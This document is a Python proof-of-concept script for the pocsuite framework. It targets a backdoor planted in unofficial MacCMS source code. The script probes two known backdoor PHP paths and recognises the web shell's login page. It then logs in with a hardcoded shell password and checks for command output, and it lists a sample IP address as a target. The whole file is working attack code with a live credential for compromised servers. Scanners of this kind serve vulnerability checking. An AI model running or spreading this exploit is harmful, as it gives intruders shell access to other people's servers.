#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from urlparse import urlparse, urljoin
from pocsuite.api.request import req


class TestPOC(POCBase):
    vulID = 'N/A'  # ssvid
    version = '1.0'
    author = ['co0ontty']
    vulDate = '2019-08-12'
    createDate = '2019-08-12'
    updateDate = '2019-08-12'
    references = ['https://mp.weixin.qq.com/s/zfTzsMe_zWrsgfFDdfx87g']
    name = 'maccms 后门'
    appPowerLink = 'http://www.maccms.com.cn/'
    appName = 'maccms'
    appVersion = 'N/A'
    vulType = '后门'
    desc = ''' maccms 非官方站点的源码存在后门程序'''
    samples = ['https://152.32.134.70:443']
    install_requires = ['']

    def _verify(self):
        def verify_backdoor(backdoor_url):
            target = urljoin(self.url,backdoor_url)
            resp = req.get(target)
            backdoor_pass = "WorldFilledWithLove"
            login_data = "getpwd={}".format(backdoor_pass)
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html"
            }
            if "#Login" in resp.text and "Microsoft YaHei" in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                try:
                    log_resp = req.post(target, headers=headers, data=login_data)
                    if "whoami"in log_resp.text and "uid" in log_resp.text:
                        result['VerifyInfo']['shellpass'] = backdoor_pass
                except:
                    pass
            
        result = {}
        try:
            verify_backdoor("extend/upyun/src/Upyun/Api/Format.php")
            return self.parse_output(result)
        except :
            verify_backdoor("extend/Qcloud/Sms/Sms.php")
            return self.parse_output(result)
        else:
            pass
        

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
